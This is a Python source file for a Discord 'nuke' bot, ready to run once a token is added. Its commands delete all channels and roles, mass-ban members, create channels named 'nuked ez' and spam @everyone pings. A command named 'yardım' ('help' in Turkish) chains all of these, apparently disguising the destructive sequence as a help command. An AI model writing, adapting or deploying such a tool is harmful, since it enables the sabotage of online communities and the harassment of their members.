import discord
from discord.ext import commands

intents = discord.Intents(messages=True, guilds=True, members=True) #YOU NEED TO OPEN YOUR BOT'S INTENTS FROM DEVELOPER PORTAL

bot = commands.Bot(command_prefix='-',intents=intents)

@bot.event
async def on_ready():
  print('We have logged in as {0.user}'.format(bot))
  for guild in bot.guilds:
        id = (guild.id)
        print(guild.name,id)
        
@bot.command(pass_context=True)
async def clear(ctx):
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            print("something went wrong (clearchannels")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            print("something went wrong (clearroles)")
    channel = await ctx.guild.create_text_channel("hahaha")
    await channel.send("https://youtu.be/2ZIpFytCSVc")

@bot.command()
async def massban(ctx):
    guild = ctx.message.guild
    for member in list(bot.get_all_members()):
        try:
            await guild.ban(member)
        except:
            pass

@bot.command(pass_context=True)
async def channel(ctx, x=1):
    guild = ctx.guild
    for i in range(x):
        await guild.create_text_channel("nuked ez")

@bot.command(pass_context=True)
async def raid(ctx):
    for i in range(20):
        for c in ctx.guild.channels:
            for k in range(5):
                await c.send(ctx.guild.default_role)

@bot.command(pass_context=True)
async def yardım(ctx):
    try:
        await massban(ctx)
        await clear(ctx)
        for i in range(100):
            await channel(ctx)
        await raid(ctx)
    except:
        print("something went wrong (nuke)")

bot.run('') #you should add your bot's token here
